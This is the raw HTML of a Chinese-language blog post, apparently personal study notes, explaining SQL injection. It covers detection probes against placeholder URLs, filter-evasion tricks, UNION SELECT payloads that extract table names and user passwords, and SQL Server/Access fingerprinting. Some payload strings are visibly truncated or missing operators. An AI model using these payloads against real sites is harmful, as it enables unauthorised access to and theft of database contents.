<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>SQL注入 | Atmet</title><meta name=keywords content="Daily"><meta name=description content="SQL注入 规则 通过发送异常数据来触发异常。
规则含义 识别Web应用上所有的数据输入，了解哪种类型的请求会触发异常，检测服务器响应中的异常。
Web应用通常包含:表示层、逻辑层、数据层。
SQL注入分类 有参数传递。
参数带入数据库查询且执行。
产生过程 Web应用开发人员无法确保在将从web表单、cookie、输入参数等收到的值传递给SQL查询之前已对其进行验证，则通常会引起SQL注入。
若攻击者能够控制发送给SQL查询的输入，且能够操纵该输入将其解析为代码而非数据，那么攻击者就有可能有能力在后台数据库上执行该代码。
若应用开发人员无法彻底理解与他们交互的基础数据库或完全无法理解并意识到所开发代码潜在的安全问题，那么他们编写的程序通常是不安全的，容易受到SQL注入攻击。
盲注 假设发现了一个SQL注入点，但应用只提供了一个通用的错误页面，或虽然提供了正常的页面，但与我们取回的内容存在一些可见或不可见的小差异，这些都属于盲注。SQL盲注是指在无法使用详细数据库错误信息或带内数据连接的情况下，利用数据库查询的输入审查漏洞从数据库提取信息或提取与数据库查询相关信息的攻击技术。
强制产生通用错误 应用中经常使用通用错误页面来替换数据库错误，即使出现通用错误页面，也可以推断SQL注入是否可行。若应用只在提交单引号或其中一个变量时才产生通用错误页面，那么很可能存在SQL盲注。提交单引号是最常见的错误源受损的SQL查询。
注入带副作用的查询 最常用的是时序攻击来确认攻击者的SQL是否已执行，有时也可利用攻击者能够观察到的输出进行判断。
拆分与平衡 分解合法输入的操作称为拆分，平衡保证最终查询中不包含不平衡的结尾单引号。
基本思想:收集合法的请求参数，之后使用SQL关键字对他们进行修改以保证与原数据不同，担当数据库解析他们时，二者的功能等价。
基于时间的盲注 所有相应都包含一种属性:发出请求到响应到达这段时间的差异。当某一状态为真时，能够让响应暂停几秒，为假时，能够不出现暂停。
基于响应的盲注 通过仔细检查响应中的数据来推断状态，推断状态时，借助响应中包含的文本或在检查特定值时强制产生的错误，产生的错误类型是运行时错误而非查询编译错误。
常用步骤 （一）发现SQL注入位置 1.整型参数判断 HTTP://xxx.xxx.xxx/xxx.asp?p=xx'，此时xxx.asp中SQL语句变成了select * from 表名 where 字段=xx' ，xx.asp运行异常。
HTTP://xxx.xxx.xxx/xxx.asp?p=xx and 1=1，xxx.asp运行正常，且与HTTP://xxx.xxx.xxx/xxx.asp?p=xx运行结果相同。
HTTP://xxx.xxx.xxx/xxx.asp?p=xx and 1=2，xxx.asp运行异常。
2.字符型参数判断 HTTP://xxx.xxx.xxx/xxx.asp?p=xx'，此时xxx.asp中的SQL语句变成了select * from 表名 where 字段=xx'，xxx.asp运行异常。
HTTP://xxx.xxx.xxx/xxx.asp?p=xx&nm...39;1'='1'，xxx.asp运行正常，且与HTTP://xxx.xxx.xxx/xxx.asp?p=xx运行结果相同。
HTTP://xxx.xxx.xxx/xxx.asp?p=xx&nb...39;1'='2'，xxx.asp运行异常。
若这三步全满足，则xxx.asp一定存在SQL注入漏洞。
特殊类型参数判断 对于字符过滤等情况，可以尝试以下方法。
大小写混合:VBS不区分大小写，程序员在设计时往往忽略大小写混合情况，可以尝试使用SelecT代替select。
UNICODE:UNICODE字符集实现国际化，+=%2B，space=%20。
ASCII:U=chr(85)，a=chr(97)。
（二）判断后台数据库类型 查询数据库名称 1' union select 1,database(); 查询数据库表名 1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(); 获取字段名 1' union select 1,group_concat(columns_name) from information_schema."><meta name=author content="DaChui"><link rel=canonical href=https://oopsdc.tk/post/sql%E6%B3%A8%E5%85%A5/><link href=/assets/css/stylesheet.min.746a86b58bb2b052b5e4df8216510494f04f81e62c08d626150c26c69ca929da.css integrity="sha256-dGqGtYuysFK15N+CFlEElPBPgeYsCNYmFQwmxpypKdo=" rel="preload stylesheet" as=style><link rel=icon href=https://oopsdc.tk/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://oopsdc.tk/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://oopsdc.tk/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://oopsdc.tk/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://oopsdc.tk/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.83.1"><meta property="og:title" content="SQL注入"><meta property="og:description" content="SQL注入 规则 通过发送异常数据来触发异常。
规则含义 识别Web应用上所有的数据输入，了解哪种类型的请求会触发异常，检测服务器响应中的异常。
Web应用通常包含:表示层、逻辑层、数据层。
SQL注入分类 有参数传递。
参数带入数据库查询且执行。
产生过程 Web应用开发人员无法确保在将从web表单、cookie、输入参数等收到的值传递给SQL查询之前已对其进行验证，则通常会引起SQL注入。
若攻击者能够控制发送给SQL查询的输入，且能够操纵该输入将其解析为代码而非数据，那么攻击者就有可能有能力在后台数据库上执行该代码。
若应用开发人员无法彻底理解与他们交互的基础数据库或完全无法理解并意识到所开发代码潜在的安全问题，那么他们编写的程序通常是不安全的，容易受到SQL注入攻击。
盲注 假设发现了一个SQL注入点，但应用只提供了一个通用的错误页面，或虽然提供了正常的页面，但与我们取回的内容存在一些可见或不可见的小差异，这些都属于盲注。SQL盲注是指在无法使用详细数据库错误信息或带内数据连接的情况下，利用数据库查询的输入审查漏洞从数据库提取信息或提取与数据库查询相关信息的攻击技术。
强制产生通用错误 应用中经常使用通用错误页面来替换数据库错误，即使出现通用错误页面，也可以推断SQL注入是否可行。若应用只在提交单引号或其中一个变量时才产生通用错误页面，那么很可能存在SQL盲注。提交单引号是最常见的错误源受损的SQL查询。
注入带副作用的查询 最常用的是时序攻击来确认攻击者的SQL是否已执行，有时也可利用攻击者能够观察到的输出进行判断。
拆分与平衡 分解合法输入的操作称为拆分，平衡保证最终查询中不包含不平衡的结尾单引号。
基本思想:收集合法的请求参数，之后使用SQL关键字对他们进行修改以保证与原数据不同，担当数据库解析他们时，二者的功能等价。
基于时间的盲注 所有相应都包含一种属性:发出请求到响应到达这段时间的差异。当某一状态为真时，能够让响应暂停几秒，为假时，能够不出现暂停。
基于响应的盲注 通过仔细检查响应中的数据来推断状态，推断状态时，借助响应中包含的文本或在检查特定值时强制产生的错误，产生的错误类型是运行时错误而非查询编译错误。
常用步骤 （一）发现SQL注入位置 1.整型参数判断 HTTP://xxx.xxx.xxx/xxx.asp?p=xx'，此时xxx.asp中SQL语句变成了select * from 表名 where 字段=xx' ，xx.asp运行异常。
HTTP://xxx.xxx.xxx/xxx.asp?p=xx and 1=1，xxx.asp运行正常，且与HTTP://xxx.xxx.xxx/xxx.asp?p=xx运行结果相同。
HTTP://xxx.xxx.xxx/xxx.asp?p=xx and 1=2，xxx.asp运行异常。
2.字符型参数判断 HTTP://xxx.xxx.xxx/xxx.asp?p=xx'，此时xxx.asp中的SQL语句变成了select * from 表名 where 字段=xx'，xxx.asp运行异常。
HTTP://xxx.xxx.xxx/xxx.asp?p=xx&nm...39;1'='1'，xxx.asp运行正常，且与HTTP://xxx.xxx.xxx/xxx.asp?p=xx运行结果相同。
HTTP://xxx.xxx.xxx/xxx.asp?p=xx&nb...39;1'='2'，xxx.asp运行异常。
若这三步全满足，则xxx.asp一定存在SQL注入漏洞。
特殊类型参数判断 对于字符过滤等情况，可以尝试以下方法。
大小写混合:VBS不区分大小写，程序员在设计时往往忽略大小写混合情况，可以尝试使用SelecT代替select。
UNICODE:UNICODE字符集实现国际化，+=%2B，space=%20。
ASCII:U=chr(85)，a=chr(97)。
（二）判断后台数据库类型 查询数据库名称 1' union select 1,database(); 查询数据库表名 1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(); 获取字段名 1' union select 1,group_concat(columns_name) from information_schema."><meta property="og:type" content="article"><meta property="og:url" content="https://oopsdc.tk/post/sql%E6%B3%A8%E5%85%A5/"><meta property="og:image" content="https://oopsdc.tk/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="post"><meta property="article:published_time" content="2020-12-07T22:06:50+08:00"><meta property="article:modified_time" content="2020-12-07T22:06:50+08:00"><meta property="og:site_name" content="Atmet"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://oopsdc.tk/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="SQL注入"><meta name=twitter:description content="SQL注入 规则 通过发送异常数据来触发异常。
规则含义 识别Web应用上所有的数据输入，了解哪种类型的请求会触发异常，检测服务器响应中的异常。
Web应用通常包含:表示层、逻辑层、数据层。
SQL注入分类 有参数传递。
参数带入数据库查询且执行。
产生过程 Web应用开发人员无法确保在将从web表单、cookie、输入参数等收到的值传递给SQL查询之前已对其进行验证，则通常会引起SQL注入。
若攻击者能够控制发送给SQL查询的输入，且能够操纵该输入将其解析为代码而非数据，那么攻击者就有可能有能力在后台数据库上执行该代码。
若应用开发人员无法彻底理解与他们交互的基础数据库或完全无法理解并意识到所开发代码潜在的安全问题，那么他们编写的程序通常是不安全的，容易受到SQL注入攻击。
盲注 假设发现了一个SQL注入点，但应用只提供了一个通用的错误页面，或虽然提供了正常的页面，但与我们取回的内容存在一些可见或不可见的小差异，这些都属于盲注。SQL盲注是指在无法使用详细数据库错误信息或带内数据连接的情况下，利用数据库查询的输入审查漏洞从数据库提取信息或提取与数据库查询相关信息的攻击技术。
强制产生通用错误 应用中经常使用通用错误页面来替换数据库错误，即使出现通用错误页面，也可以推断SQL注入是否可行。若应用只在提交单引号或其中一个变量时才产生通用错误页面，那么很可能存在SQL盲注。提交单引号是最常见的错误源受损的SQL查询。
注入带副作用的查询 最常用的是时序攻击来确认攻击者的SQL是否已执行，有时也可利用攻击者能够观察到的输出进行判断。
拆分与平衡 分解合法输入的操作称为拆分，平衡保证最终查询中不包含不平衡的结尾单引号。
基本思想:收集合法的请求参数，之后使用SQL关键字对他们进行修改以保证与原数据不同，担当数据库解析他们时，二者的功能等价。
基于时间的盲注 所有相应都包含一种属性:发出请求到响应到达这段时间的差异。当某一状态为真时，能够让响应暂停几秒，为假时，能够不出现暂停。
基于响应的盲注 通过仔细检查响应中的数据来推断状态，推断状态时，借助响应中包含的文本或在检查特定值时强制产生的错误，产生的错误类型是运行时错误而非查询编译错误。
常用步骤 （一）发现SQL注入位置 1.整型参数判断 HTTP://xxx.xxx.xxx/xxx.asp?p=xx'，此时xxx.asp中SQL语句变成了select * from 表名 where 字段=xx' ，xx.asp运行异常。
HTTP://xxx.xxx.xxx/xxx.asp?p=xx and 1=1，xxx.asp运行正常，且与HTTP://xxx.xxx.xxx/xxx.asp?p=xx运行结果相同。
HTTP://xxx.xxx.xxx/xxx.asp?p=xx and 1=2，xxx.asp运行异常。
2.字符型参数判断 HTTP://xxx.xxx.xxx/xxx.asp?p=xx'，此时xxx.asp中的SQL语句变成了select * from 表名 where 字段=xx'，xxx.asp运行异常。
HTTP://xxx.xxx.xxx/xxx.asp?p=xx&nm...39;1'='1'，xxx.asp运行正常，且与HTTP://xxx.xxx.xxx/xxx.asp?p=xx运行结果相同。
HTTP://xxx.xxx.xxx/xxx.asp?p=xx&nb...39;1'='2'，xxx.asp运行异常。
若这三步全满足，则xxx.asp一定存在SQL注入漏洞。
特殊类型参数判断 对于字符过滤等情况，可以尝试以下方法。
大小写混合:VBS不区分大小写，程序员在设计时往往忽略大小写混合情况，可以尝试使用SelecT代替select。
UNICODE:UNICODE字符集实现国际化，+=%2B，space=%20。
ASCII:U=chr(85)，a=chr(97)。
（二）判断后台数据库类型 查询数据库名称 1' union select 1,database(); 查询数据库表名 1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(); 获取字段名 1' union select 1,group_concat(columns_name) from information_schema."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://oopsdc.tk/post/"},{"@type":"ListItem","position":2,"name":"SQL注入","item":"https://oopsdc.tk/post/sql%E6%B3%A8%E5%85%A5/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"SQL注入","name":"SQL注入","description":"SQL注入 规则 通过发送异常数据来触发异常。\n规则含义 识别Web应用上所有的数据输入，了解哪种类型的请求会触发异常，检测服务器响应中的异常。\nWeb应用通常包含:表示层、逻辑层、数据层。\nSQL注入分类 有参数传递。\n参数带入数据库查询且执行。\n产生过程 Web应用开发人员无法确保在将从web表单、cookie、输入参数等收到的值传递给SQL查询之前已对其进行验证，则通常会引起SQL注入。\n若攻击者能够控制发送给SQL查询的输入，且能够操纵该输入将其解析为代码而非数据，那么攻击者就有可能有能力在后台数据库上执行该代码。\n若应用开发人员无法彻底理解与他们交互的基础数据库或完全无法理解并意识到所开发代码潜在的安全问题，那么他们编写的程序通常是不安全的，容易受到SQL注入攻击。\n盲注 假设发现了一个SQL注入点，但应用只提供了一个通用的错误页面，或虽然提供了正常的页面，但与我们取回的内容存在一些可见或不可见的小差异，这些都属于盲注。SQL盲注是指在无法使用详细数据库错误信息或带内数据连接的情况下，利用数据库查询的输入审查漏洞从数据库提取信息或提取与数据库查询相关信息的攻击技术。\n强制产生通用错误 应用中经常使用通用错误页面来替换数据库错误，即使出现通用错误页面，也可以推断SQL注入是否可行。若应用只在提交单引号或其中一个变量时才产生通用错误页面，那么很可能存在SQL盲注。提交单引号是最常见的错误源受损的SQL查询。\n注入带副作用的查询 最常用的是时序攻击来确认攻击者的SQL是否已执行，有时也可利用攻击者能够观察到的输出进行判断。\n拆分与平衡 分解合法输入的操作称为拆分，平衡保证最终查询中不包含不平衡的结尾单引号。\n基本思想:收集合法的请求参数，之后使用SQL关键字对他们进行修改以保证与原数据不同，担当数据库解析他们时，二者的功能等价。\n基于时间的盲注 所有相应都包含一种属性:发出请求到响应到达这段时间的差异。当某一状态为真时，能够让响应暂停几秒，为假时，能够不出现暂停。\n基于响应的盲注 通过仔细检查响应中的数据来推断状态，推断状态时，借助响应中包含的文本或在检查特定值时强制产生的错误，产生的错误类型是运行时错误而非查询编译错误。\n常用步骤 （一）发现SQL注入位置 1.整型参数判断 HTTP://xxx.xxx.xxx/xxx.asp?p=xx'，此时xxx.asp中SQL语句变成了select * from 表名 where 字段=xx' ，xx.asp运行异常。\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx and 1=1，xxx.asp运行正常，且与HTTP://xxx.xxx.xxx/xxx.asp?p=xx运行结果相同。\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx and 1=2，xxx.asp运行异常。\n2.字符型参数判断 HTTP://xxx.xxx.xxx/xxx.asp?p=xx'，此时xxx.asp中的SQL语句变成了select * from 表名 where 字段=xx'，xxx.asp运行异常。\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx\u0026amp;nm...39;1'='1'，xxx.asp运行正常，且与HTTP://xxx.xxx.xxx/xxx.asp?p=xx运行结果相同。\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx\u0026amp;nb...39;1'='2'，xxx.asp运行异常。\n若这三步全满足，则xxx.asp一定存在SQL注入漏洞。\n特殊类型参数判断 对于字符过滤等情况，可以尝试以下方法。\n大小写混合:VBS不区分大小写，程序员在设计时往往忽略大小写混合情况，可以尝试使用SelecT代替select。\nUNICODE:UNICODE字符集实现国际化，+=%2B，space=%20。\nASCII:U=chr(85)，a=chr(97)。\n（二）判断后台数据库类型 查询数据库名称 1\u0026#39; union select 1,database(); 查询数据库表名 1\u0026#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(); 获取字段名 1\u0026#39; union select 1,group_concat(columns_name) from information_schema.","keywords":["Daily"],"articleBody":"SQL注入 规则 通过发送异常数据来触发异常。\n规则含义 识别Web应用上所有的数据输入，了解哪种类型的请求会触发异常，检测服务器响应中的异常。\nWeb应用通常包含:表示层、逻辑层、数据层。\nSQL注入分类 有参数传递。\n参数带入数据库查询且执行。\n产生过程 Web应用开发人员无法确保在将从web表单、cookie、输入参数等收到的值传递给SQL查询之前已对其进行验证，则通常会引起SQL注入。\n若攻击者能够控制发送给SQL查询的输入，且能够操纵该输入将其解析为代码而非数据，那么攻击者就有可能有能力在后台数据库上执行该代码。\n若应用开发人员无法彻底理解与他们交互的基础数据库或完全无法理解并意识到所开发代码潜在的安全问题，那么他们编写的程序通常是不安全的，容易受到SQL注入攻击。\n盲注 假设发现了一个SQL注入点，但应用只提供了一个通用的错误页面，或虽然提供了正常的页面，但与我们取回的内容存在一些可见或不可见的小差异，这些都属于盲注。SQL盲注是指在无法使用详细数据库错误信息或带内数据连接的情况下，利用数据库查询的输入审查漏洞从数据库提取信息或提取与数据库查询相关信息的攻击技术。\n强制产生通用错误 应用中经常使用通用错误页面来替换数据库错误，即使出现通用错误页面，也可以推断SQL注入是否可行。若应用只在提交单引号或其中一个变量时才产生通用错误页面，那么很可能存在SQL盲注。提交单引号是最常见的错误源受损的SQL查询。\n注入带副作用的查询 最常用的是时序攻击来确认攻击者的SQL是否已执行，有时也可利用攻击者能够观察到的输出进行判断。\n拆分与平衡 分解合法输入的操作称为拆分，平衡保证最终查询中不包含不平衡的结尾单引号。\n基本思想:收集合法的请求参数，之后使用SQL关键字对他们进行修改以保证与原数据不同，担当数据库解析他们时，二者的功能等价。\n基于时间的盲注 所有相应都包含一种属性:发出请求到响应到达这段时间的差异。当某一状态为真时，能够让响应暂停几秒，为假时，能够不出现暂停。\n基于响应的盲注 通过仔细检查响应中的数据来推断状态，推断状态时，借助响应中包含的文本或在检查特定值时强制产生的错误，产生的错误类型是运行时错误而非查询编译错误。\n常用步骤 （一）发现SQL注入位置 1.整型参数判断 HTTP://xxx.xxx.xxx/xxx.asp?p=xx'，此时xxx.asp中SQL语句变成了select * from 表名 where 字段=xx' ，xx.asp运行异常。\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx and 1=1，xxx.asp运行正常，且与HTTP://xxx.xxx.xxx/xxx.asp?p=xx运行结果相同。\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx and 1=2，xxx.asp运行异常。\n2.字符型参数判断 HTTP://xxx.xxx.xxx/xxx.asp?p=xx'，此时xxx.asp中的SQL语句变成了select * from 表名 where 字段=xx'，xxx.asp运行异常。\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx\u0026nm...39;1'='1'，xxx.asp运行正常，且与HTTP://xxx.xxx.xxx/xxx.asp?p=xx运行结果相同。\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx\u0026nb...39;1'='2'，xxx.asp运行异常。\n若这三步全满足，则xxx.asp一定存在SQL注入漏洞。\n特殊类型参数判断 对于字符过滤等情况，可以尝试以下方法。\n大小写混合:VBS不区分大小写，程序员在设计时往往忽略大小写混合情况，可以尝试使用SelecT代替select。\nUNICODE:UNICODE字符集实现国际化，+=%2B，space=%20。\nASCII:U=chr(85)，a=chr(97)。\n（二）判断后台数据库类型 查询数据库名称 1' union select 1,database(); 查询数据库表名 1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(); 获取字段名 1' union select 1,group_concat(columns_name) from information_schema.columns where table_name='tablename'; 获取数据库详细内容 1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users; （三）判断数据库 SQL Server SQL Server有user，db_name()等系统变量，利用这些系统值不仅可以判断SQL Server，还能得到其他信息。\nSQL Server系统表为sysobjects，在Web环境下有访问权限。\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx and user0，可以判断是否为SQL Server，还能得到当前连接到数据库的用户名。\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx\u0026n...db_name()0，可以判断是否为SQL Server，还能得到当前正在使用的数据库名。\nAccess Access系统表为msysobjects，且在Web环境下没有访问权限。\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx and (select count(*) from sysobjects)0\nHTTP://xxx.xxx.xxx/xxx.asp?p=xx and (select count(*) from msysobjects)0\n若数据库为SQL Server，则第一条语句xxx.asp运行正常，第二条语句异常；若数据库为Access，两条语句均异常。\nMSSQL sysdatabase:系统表，每个数据库在表中占一行，该表只存储在master数据库中，保存了所有库名、库ID及一些相关信息。\nsysobjects:存放数据库内创建的所有对象，如约束、默认值、日志、规则、存储过程等，每个对象在表中占一行。\nsyscolumns:每个表和视图中的每列在表中占一行，存储过程中的每个参数在表中也占一行，该表位于每个数据库中。主要字段:name(字段名称)，id(表ID号)，colid(字段ID号)，id是sysobjects得到的表ID号。\n（四）确定XP_CMDSHELL可执行情况  本文链接:SQL注入 | Atmet (oopsdc.tk)\n文章许可:本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","wordCount":"132","inLanguage":"en","datePublished":"2020-12-07T22:06:50+08:00","dateModified":"2020-12-07T22:06:50+08:00","author":{"@type":"Person","name":"DaChui"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://oopsdc.tk/post/sql%E6%B3%A8%E5%85%A5/"},"publisher":{"@type":"Organization","name":"Atmet","logo":{"@type":"ImageObject","url":"https://oopsdc.tk/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script><noscript><style type=text/css>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><header class=header><nav class=nav><div class=logo><a href=https://oopsdc.tk/ accesskey=h title="Home (Alt + H)">Home</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://oopsdc.tk/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://oopsdc.tk/links/ title=Links><span>Links</span></a></li><li><a href=https://oopsdc.tk/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://oopsdc.tk/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://oopsdc.tk/>Home</a>&nbsp;»&nbsp;<a href=https://oopsdc.tk/post/>Posts</a></div><h1 class=post-title>SQL注入</h1><div class=post-meta>December 7, 2020&nbsp;·&nbsp;1 min&nbsp;·&nbsp;DaChui</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><div class=details>Table of Contents</div></summary><div class=inner><ul><li><a href=#sql%e6%b3%a8%e5%85%a5 aria-label=SQL注入>SQL注入</a><ul><li><a href=#%e8%a7%84%e5%88%99 aria-label=规则>规则</a></li><li><a href=#%e8%a7%84%e5%88%99%e5%90%ab%e4%b9%89 aria-label=规则含义>规则含义</a></li><li><a href=#sql%e6%b3%a8%e5%85%a5%e5%88%86%e7%b1%bb aria-label=SQL注入分类>SQL注入分类</a></li><li><a href=#%e4%ba%a7%e7%94%9f%e8%bf%87%e7%a8%8b aria-label=产生过程>产生过程</a></li><li><a href=#%e7%9b%b2%e6%b3%a8 aria-label=盲注>盲注</a><ul><li><a href=#%e5%bc%ba%e5%88%b6%e4%ba%a7%e7%94%9f%e9%80%9a%e7%94%a8%e9%94%99%e8%af%af aria-label=强制产生通用错误>强制产生通用错误</a></li><li><a href=#%e6%b3%a8%e5%85%a5%e5%b8%a6%e5%89%af%e4%bd%9c%e7%94%a8%e7%9a%84%e6%9f%a5%e8%af%a2 aria-label=注入带副作用的查询>注入带副作用的查询</a></li><li><a href=#%e6%8b%86%e5%88%86%e4%b8%8e%e5%b9%b3%e8%a1%a1 aria-label=拆分与平衡>拆分与平衡</a></li><li><a href=#%e5%9f%ba%e4%ba%8e%e6%97%b6%e9%97%b4%e7%9a%84%e7%9b%b2%e6%b3%a8 aria-label=基于时间的盲注>基于时间的盲注</a></li><li><a href=#%e5%9f%ba%e4%ba%8e%e5%93%8d%e5%ba%94%e7%9a%84%e7%9b%b2%e6%b3%a8 aria-label=基于响应的盲注>基于响应的盲注</a></li></ul></li><li><a href=#%e5%b8%b8%e7%94%a8%e6%ad%a5%e9%aa%a4 aria-label=常用步骤>常用步骤</a><ul><li><a href=#%e4%b8%80%e5%8f%91%e7%8e%b0sql%e6%b3%a8%e5%85%a5%e4%bd%8d%e7%bd%ae aria-label=（一）发现SQL注入位置>（一）发现SQL注入位置</a><ul><li><a href=#1%e6%95%b4%e5%9e%8b%e5%8f%82%e6%95%b0%e5%88%a4%e6%96%ad aria-label=1.整型参数判断>1.整型参数判断</a></li><li><a href=#2%e5%ad%97%e7%ac%a6%e5%9e%8b%e5%8f%82%e6%95%b0%e5%88%a4%e6%96%ad aria-label=2.字符型参数判断>2.字符型参数判断</a></li><li><a href=#%e7%89%b9%e6%ae%8a%e7%b1%bb%e5%9e%8b%e5%8f%82%e6%95%b0%e5%88%a4%e6%96%ad aria-label=特殊类型参数判断>特殊类型参数判断</a></li></ul></li><li><a href=#%e4%ba%8c%e5%88%a4%e6%96%ad%e5%90%8e%e5%8f%b0%e6%95%b0%e6%8d%ae%e5%ba%93%e7%b1%bb%e5%9e%8b aria-label=（二）判断后台数据库类型>（二）判断后台数据库类型</a><ul><li><a href=#%e6%9f%a5%e8%af%a2%e6%95%b0%e6%8d%ae%e5%ba%93%e5%90%8d%e7%a7%b0 aria-label=查询数据库名称>查询数据库名称</a></li><li><a href=#%e6%9f%a5%e8%af%a2%e6%95%b0%e6%8d%ae%e5%ba%93%e8%a1%a8%e5%90%8d aria-label=查询数据库表名>查询数据库表名</a></li><li><a href=#%e8%8e%b7%e5%8f%96%e5%ad%97%e6%ae%b5%e5%90%8d aria-label=获取字段名>获取字段名</a></li><li><a href=#%e8%8e%b7%e5%8f%96%e6%95%b0%e6%8d%ae%e5%ba%93%e8%af%a6%e7%bb%86%e5%86%85%e5%ae%b9 aria-label=获取数据库详细内容>获取数据库详细内容</a></li></ul></li><li><a href=#%e4%b8%89%e5%88%a4%e6%96%ad%e6%95%b0%e6%8d%ae%e5%ba%93 aria-label=（三）判断数据库>（三）判断数据库</a><ul><li><a href=#sql-server aria-label="SQL Server">SQL Server</a></li><li><a href=#access aria-label=Access>Access</a></li><li><a href=#mssql aria-label=MSSQL>MSSQL</a></li></ul></li><li><a href=#%e5%9b%9b%e7%a1%ae%e5%ae%9axp_cmdshell%e5%8f%af%e6%89%a7%e8%a1%8c%e6%83%85%e5%86%b5 aria-label=（四）确定XP_CMDSHELL可执行情况>（四）确定XP_CMDSHELL可执行情况</a></li></ul></li></ul></li></ul></div></details></div><div class=post-content><h1 id=sql注入>SQL注入<a hidden class=anchor aria-hidden=true href=#sql注入>#</a></h1><h2 id=规则>规则<a hidden class=anchor aria-hidden=true href=#规则>#</a></h2><p>通过发送异常数据来触发异常。</p><h2 id=规则含义>规则含义<a hidden class=anchor aria-hidden=true href=#规则含义>#</a></h2><p>识别<code>Web应用</code>上所有的数据输入，了解哪种类型的请求会触发异常，检测服务器响应中的异常。</p><p><code>Web应用</code>通常包含:表示层、逻辑层、数据层。</p><h2 id=sql注入分类>SQL注入分类<a hidden class=anchor aria-hidden=true href=#sql注入分类>#</a></h2><p>有参数传递。</p><p>参数带入数据库查询且执行。</p><h2 id=产生过程>产生过程<a hidden class=anchor aria-hidden=true href=#产生过程>#</a></h2><p><code>Web应用</code>开发人员无法确保在将从<code>web表单</code>、<code>cookie</code>、输入参数等收到的值传递给<code>SQL查询</code>之前已对其进行验证，则通常会引起<code>SQL注入</code>。</p><p>若攻击者能够控制发送给<code>SQL查询</code>的输入，且能够操纵该输入将其解析为代码而非数据，那么攻击者就有可能有能力在后台数据库上执行该代码。</p><p>若应用开发人员无法彻底理解与他们交互的基础数据库或完全无法理解并意识到所开发代码潜在的安全问题，那么他们编写的程序通常是不安全的，容易受到<code>SQL注入</code>攻击。</p><h2 id=盲注>盲注<a hidden class=anchor aria-hidden=true href=#盲注>#</a></h2><p>假设发现了一个<code>SQL注入点</code>，但应用只提供了一个通用的错误页面，或虽然提供了正常的页面，但与我们取回的内容存在一些可见或不可见的小差异，这些都属于盲注。<code>SQL盲注</code>是指在无法使用详细数据库错误信息或带内数据连接的情况下，利用数据库查询的输入审查漏洞从数据库提取信息或提取与数据库查询相关信息的攻击技术。</p><h3 id=强制产生通用错误>强制产生通用错误<a hidden class=anchor aria-hidden=true 